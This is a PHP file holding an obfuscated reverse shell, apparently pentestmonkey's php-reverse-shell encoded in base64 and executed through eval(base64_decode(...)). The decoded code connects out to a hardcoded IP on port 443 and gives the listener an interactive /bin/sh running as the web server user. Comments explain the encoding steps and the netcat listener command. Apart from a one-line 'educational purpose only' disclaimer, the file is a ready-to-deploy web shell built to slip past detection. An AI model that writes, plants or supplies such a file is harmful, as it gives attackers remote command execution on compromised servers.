<?php 
# this webshell is pentest's monkey php webshell encoded in base64
# Process to encode the file:
# - store the entire php webshell in a file
# - edit the IP and PORT
# - cat <unencoded>.php | base64 > <encoded>.php
# IP = 192.168.1.81
# port = 443/tcp
# run nc -lvnp 443 or rlwrap -lvnp 443 as a listener
# This file is for educational purpose only, we're not responsible for
# any of your actions. Please behave in an ethical and legal way!
eval("?>".base64_decode("
PD9waHAKLy8gcGhwLXJldmVyc2Utc2hlbGwgLSBBIFJldmVyc2UgU2hlbGwgaW1wbGVtZW50YXRp
b24gaW4gUEhQCi8vIENvcHlyaWdodCAoQykgMjAwNyBwZW50ZXN0bW9ua2V5QHBlbnRlc3Rtb25r
ZXkubmV0Ci8vCi8vIFRoaXMgdG9vbCBtYXkgYmUgdXNlZCBmb3IgbGVnYWwgcHVycG9zZXMgb25s
eS4gIFVzZXJzIHRha2UgZnVsbCByZXNwb25zaWJpbGl0eQovLyBmb3IgYW55IGFjdGlvbnMgcGVy
Zm9ybWVkIHVzaW5nIHRoaXMgdG9vbC4gIFRoZSBhdXRob3IgYWNjZXB0cyBubyBsaWFiaWxpdHkK
Ly8gZm9yIGRhbWFnZSBjYXVzZWQgYnkgdGhpcyB0b29sLiAgSWYgdGhlc2UgdGVybXMgYXJlIG5v
dCBhY2NlcHRhYmxlIHRvIHlvdSwgdGhlbgovLyBkbyBub3QgdXNlIHRoaXMgdG9vbC4KLy8KLy8g
SW4gYWxsIG90aGVyIHJlc3BlY3RzIHRoZSBHUEwgdmVyc2lvbiAyIGFwcGxpZXM6Ci8vCi8vIFRo
aXMgcHJvZ3JhbSBpcyBmcmVlIHNvZnR3YXJlOyB5b3UgY2FuIHJlZGlzdHJpYnV0ZSBpdCBhbmQv
b3IgbW9kaWZ5Ci8vIGl0IHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGlj
IExpY2Vuc2UgdmVyc2lvbiAyIGFzCi8vIHB1Ymxpc2hlZCBieSB0aGUgRnJlZSBTb2Z0d2FyZSBG
b3VuZGF0aW9uLgovLwovLyBUaGlzIHByb2dyYW0gaXMgZGlzdHJpYnV0ZWQgaW4gdGhlIGhvcGUg
dGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCwKLy8gYnV0IFdJVEhPVVQgQU5ZIFdBUlJBTlRZOyB3aXRo
b3V0IGV2ZW4gdGhlIGltcGxpZWQgd2FycmFudHkgb2YKLy8gTUVSQ0hBTlRBQklMSVRZIG9yIEZJ
VE5FU1MgRk9SIEEgUEFSVElDVUxBUiBQVVJQT1NFLiAgU2VlIHRoZQovLyBHTlUgR2VuZXJhbCBQ
dWJsaWMgTGljZW5zZSBmb3IgbW9yZSBkZXRhaWxzLgovLwovLyBZb3Ugc2hvdWxkIGhhdmUgcmVj
ZWl2ZWQgYSBjb3B5IG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBhbG9uZwovLyB3
aXRoIHRoaXMgcHJvZ3JhbTsgaWYgbm90LCB3cml0ZSB0byB0aGUgRnJlZSBTb2Z0d2FyZSBGb3Vu
ZGF0aW9uLCBJbmMuLAovLyA1MSBGcmFua2xpbiBTdHJlZXQsIEZpZnRoIEZsb29yLCBCb3N0b24s
IE1BIDAyMTEwLTEzMDEgVVNBLgovLwovLyBUaGlzIHRvb2wgbWF5IGJlIHVzZWQgZm9yIGxlZ2Fs
IHB1cnBvc2VzIG9ubHkuICBVc2VycyB0YWtlIGZ1bGwgcmVzcG9uc2liaWxpdHkKLy8gZm9yIGFu
eSBhY3Rpb25zIHBlcmZvcm1lZCB1c2luZyB0aGlzIHRvb2wuICBJZiB0aGVzZSB0ZXJtcyBhcmUg
bm90IGFjY2VwdGFibGUgdG8KLy8geW91LCB0aGVuIGRvIG5vdCB1c2UgdGhpcyB0b29sLgovLwov
LyBZb3UgYXJlIGVuY291cmFnZWQgdG8gc2VuZCBjb21tZW50cywgaW1wcm92ZW1lbnRzIG9yIHN1
Z2dlc3Rpb25zIHRvCi8vIG1lIGF0IHBlbnRlc3Rtb25rZXlAcGVudGVzdG1vbmtleS5uZXQKLy8K
Ly8gRGVzY3JpcHRpb24KLy8gLS0tLS0tLS0tLS0KLy8gVGhpcyBzY3JpcHQgd2lsbCBtYWtlIGFu
IG91dGJvdW5kIFRDUCBjb25uZWN0aW9uIHRvIGEgaGFyZGNvZGVkIElQIGFuZCBwb3J0LgovLyBU
aGUgcmVjaXBpZW50IHdpbGwgYmUgZ2l2ZW4gYSBzaGVsbCBydW5uaW5nIGFzIHRoZSBjdXJyZW50
IHVzZXIgKGFwYWNoZSBub3JtYWxseSkuCi8vCi8vIExpbWl0YXRpb25zCi8vIC0tLS0tLS0tLS0t
Ci8vIHByb2Nfb3BlbiBhbmQgc3RyZWFtX3NldF9ibG9ja2luZyByZXF1aXJlIFBIUCB2ZXJzaW9u
IDQuMyssIG9yIDUrCi8vIFVzZSBvZiBzdHJlYW1fc2VsZWN0KCkgb24gZmlsZSBkZXNjcmlwdG9y
cyByZXR1cm5lZCBieSBwcm9jX29wZW4oKSB3aWxsIGZhaWwgYW5kIHJldHVybiBGQUxTRSB1bmRl
ciBXaW5kb3dzLgovLyBTb21lIGNvbXBpbGUtdGltZSBvcHRpb25zIGFyZSBuZWVkZWQgZm9yIGRh
ZW1vbmlzYXRpb24gKGxpa2UgcGNudGwsIHBvc2l4KS4gIFRoZXNlIGFyZSByYXJlbHkgYXZhaWxh
YmxlLgovLwovLyBVc2FnZQovLyAtLS0tLQovLyBTZWUgaHR0cDovL3BlbnRlc3Rtb25rZXkubmV0
L3Rvb2xzL3BocC1yZXZlcnNlLXNoZWxsIGlmIHlvdSBnZXQgc3R1Y2suCgpzZXRfdGltZV9saW1p
dCAoMCk7CiRWRVJTSU9OID0gIjEuMCI7CiRpcCA9ICcxOTIuMTY4LjEuODEnOyAgLy8gQ0hBTkdF
IFRISVMKJHBvcnQgPSA0NDM7ICAgICAgIC8vIENIQU5HRSBUSElTCiRjaHVua19zaXplID0gMTQw
MDsKJHdyaXRlX2EgPSBudWxsOwokZXJyb3JfYSA9IG51bGw7CiRzaGVsbCA9ICd1bmFtZSAtYTsg
dzsgaWQ7IC9iaW4vc2ggLWknOwokZGFlbW9uID0gMDsKJGRlYnVnID0gMDsKCi8vCi8vIERhZW1v
bmlzZSBvdXJzZWxmIGlmIHBvc3NpYmxlIHRvIGF2b2lkIHpvbWJpZXMgbGF0ZXIKLy8KCi8vIHBj
bnRsX2ZvcmsgaXMgaGFyZGx5IGV2ZXIgYXZhaWxhYmxlLCBidXQgd2lsbCBhbGxvdyB1cyB0byBk
YWVtb25pc2UKLy8gb3VyIHBocCBwcm9jZXNzIGFuZCBhdm9pZCB6b21iaWVzLiAgV29ydGggYSB0
cnkuLi4KaWYgKGZ1bmN0aW9uX2V4aXN0cygncGNudGxfZm9yaycpKSB7CgkvLyBGb3JrIGFuZCBo
YXZlIHRoZSBwYXJlbnQgcHJvY2VzcyBleGl0CgkkcGlkID0gcGNudGxfZm9yaygpOwoJCglpZiAo
JHBpZCA9PSAtMSkgewoJCXByaW50aXQoIkVSUk9SOiBDYW4ndCBmb3JrIik7CgkJZXhpdCgxKTsK
CX0KCQoJaWYgKCRwaWQpIHsKCQlleGl0KDApOyAgLy8gUGFyZW50IGV4aXRzCgl9CgoJLy8gTWFr
ZSB0aGUgY3VycmVudCBwcm9jZXNzIGEgc2Vzc2lvbiBsZWFkZXIKCS8vIFdpbGwgb25seSBzdWNj
ZWVkIGlmIHdlIGZvcmtlZAoJaWYgKHBvc2l4X3NldHNpZCgpID09IC0xKSB7CgkJcHJpbnRpdCgi
RXJyb3I6IENhbid0IHNldHNpZCgpIik7CgkJZXhpdCgxKTsKCX0KCgkkZGFlbW9uID0gMTsKfSBl
bHNlIHsKCXByaW50aXQoIldBUk5JTkc6IEZhaWxlZCB0byBkYWVtb25pc2UuICBUaGlzIGlzIHF1
aXRlIGNvbW1vbiBhbmQgbm90IGZhdGFsLiIpOwp9CgovLyBDaGFuZ2UgdG8gYSBzYWZlIGRpcmVj
dG9yeQpjaGRpcigiLyIpOwoKLy8gUmVtb3ZlIGFueSB1bWFzayB3ZSBpbmhlcml0ZWQKdW1hc2so
MCk7CgovLwovLyBEbyB0aGUgcmV2ZXJzZSBzaGVsbC4uLgovLwoKLy8gT3BlbiByZXZlcnNlIGNv
bm5lY3Rpb24KJHNvY2sgPSBmc29ja29wZW4oJGlwLCAkcG9ydCwgJGVycm5vLCAkZXJyc3RyLCAz
MCk7CmlmICghJHNvY2spIHsKCXByaW50aXQoIiRlcnJzdHIgKCRlcnJubykiKTsKCWV4aXQoMSk7
Cn0KCi8vIFNwYXduIHNoZWxsIHByb2Nlc3MKJGRlc2NyaXB0b3JzcGVjID0gYXJyYXkoCiAgIDAg
PT4gYXJyYXkoInBpcGUiLCAiciIpLCAgLy8gc3RkaW4gaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxk
IHdpbGwgcmVhZCBmcm9tCiAgIDEgPT4gYXJyYXkoInBpcGUiLCAidyIpLCAgLy8gc3Rkb3V0IGlz
IGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHdyaXRlIHRvCiAgIDIgPT4gYXJyYXkoInBpcGUi
LCAidyIpICAgLy8gc3RkZXJyIGlzIGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHdyaXRlIHRv
Cik7CgokcHJvY2VzcyA9IHByb2Nfb3Blbigkc2hlbGwsICRkZXNjcmlwdG9yc3BlYywgJHBpcGVz
KTsKCmlmICghaXNfcmVzb3VyY2UoJHByb2Nlc3MpKSB7CglwcmludGl0KCJFUlJPUjogQ2FuJ3Qg
c3Bhd24gc2hlbGwiKTsKCWV4aXQoMSk7Cn0KCi8vIFNldCBldmVyeXRoaW5nIHRvIG5vbi1ibG9j
a2luZwovLyBSZWFzb246IE9jY3Npb25hbGx5IHJlYWRzIHdpbGwgYmxvY2ssIGV2ZW4gdGhvdWdo
IHN0cmVhbV9zZWxlY3QgdGVsbHMgdXMgdGhleSB3b24ndApzdHJlYW1fc2V0X2Jsb2NraW5nKCRw
aXBlc1swXSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzFdLCAwKTsKc3RyZWFtX3Nl
dF9ibG9ja2luZygkcGlwZXNbMl0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5nKCRzb2NrLCAwKTsK
CnByaW50aXQoIlN1Y2Nlc3NmdWxseSBvcGVuZWQgcmV2ZXJzZSBzaGVsbCB0byAkaXA6JHBvcnQi
KTsKCndoaWxlICgxKSB7CgkvLyBDaGVjayBmb3IgZW5kIG9mIFRDUCBjb25uZWN0aW9uCglpZiAo
ZmVvZigkc29jaykpIHsKCQlwcmludGl0KCJFUlJPUjogU2hlbGwgY29ubmVjdGlvbiB0ZXJtaW5h
dGVkIik7CgkJYnJlYWs7Cgl9CgoJLy8gQ2hlY2sgZm9yIGVuZCBvZiBTVERPVVQKCWlmIChmZW9m
KCRwaXBlc1sxXSkpIHsKCQlwcmludGl0KCJFUlJPUjogU2hlbGwgcHJvY2VzcyB0ZXJtaW5hdGVk
Iik7CgkJYnJlYWs7Cgl9CgoJLy8gV2FpdCB1bnRpbCBhIGNvbW1hbmQgaXMgZW5kIGRvd24gJHNv
Y2ssIG9yIHNvbWUKCS8vIGNvbW1hbmQgb3V0cHV0IGlzIGF2YWlsYWJsZSBvbiBTVERPVVQgb3Ig
U1RERVJSCgkkcmVhZF9hID0gYXJyYXkoJHNvY2ssICRwaXBlc1sxXSwgJHBpcGVzWzJdKTsKCSRu
dW1fY2hhbmdlZF9zb2NrZXRzID0gc3RyZWFtX3NlbGVjdCgkcmVhZF9hLCAkd3JpdGVfYSwgJGVy
cm9yX2EsIG51bGwpOwoKCS8vIElmIHdlIGNhbiByZWFkIGZyb20gdGhlIFRDUCBzb2NrZXQsIHNl
bmQKCS8vIGRhdGEgdG8gcHJvY2VzcydzIFNURElOCglpZiAoaW5fYXJyYXkoJHNvY2ssICRyZWFk
X2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU09DSyBSRUFEIik7CgkJJGlucHV0ID0gZnJl
YWQoJHNvY2ssICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTT0NLOiAkaW5w
dXQiKTsKCQlmd3JpdGUoJHBpcGVzWzBdLCAkaW5wdXQpOwoJfQoKCS8vIElmIHdlIGNhbiByZWFk
IGZyb20gdGhlIHByb2Nlc3MncyBTVERPVVQKCS8vIHNlbmQgZGF0YSBkb3duIHRjcCBjb25uZWN0
aW9uCglpZiAoaW5fYXJyYXkoJHBpcGVzWzFdLCAkcmVhZF9hKSkgewoJCWlmICgkZGVidWcpIHBy
aW50aXQoIlNURE9VVCBSRUFEIik7CgkJJGlucHV0ID0gZnJlYWQoJHBpcGVzWzFdLCAkY2h1bmtf
c2l6ZSk7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RET1VUOiAkaW5wdXQiKTsKCQlmd3JpdGUo
JHNvY2ssICRpbnB1dCk7Cgl9CgoJLy8gSWYgd2UgY2FuIHJlYWQgZnJvbSB0aGUgcHJvY2Vzcydz
IFNUREVSUgoJLy8gc2VuZCBkYXRhIGRvd24gdGNwIGNvbm5lY3Rpb24KCWlmIChpbl9hcnJheSgk
cGlwZXNbMl0sICRyZWFkX2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RERVJSIFJFQUQi
KTsKCQkkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMl0sICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVn
KSBwcmludGl0KCJTVERFUlI6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkc29jaywgJGlucHV0KTsKCX0K
fQoKZmNsb3NlKCRzb2NrKTsKZmNsb3NlKCRwaXBlc1swXSk7CmZjbG9zZSgkcGlwZXNbMV0pOwpm
Y2xvc2UoJHBpcGVzWzJdKTsKcHJvY19jbG9zZSgkcHJvY2Vzcyk7CgovLyBMaWtlIHByaW50LCBi
dXQgZG9lcyBub3RoaW5nIGlmIHdlJ3ZlIGRhZW1vbmlzZWQgb3Vyc2VsZgovLyAoSSBjYW4ndCBm
aWd1cmUgb3V0IGhvdyB0byByZWRpcmVjdCBTVERPVVQgbGlrZSBhIHByb3BlciBkYWVtb24pCmZ1
bmN0aW9uIHByaW50aXQgKCRzdHJpbmcpIHsKCWlmICghJGRhZW1vbikgewoJCXByaW50ICIkc3Ry
aW5nXG4iOwoJfQp9Cj8+Cg==")); ?>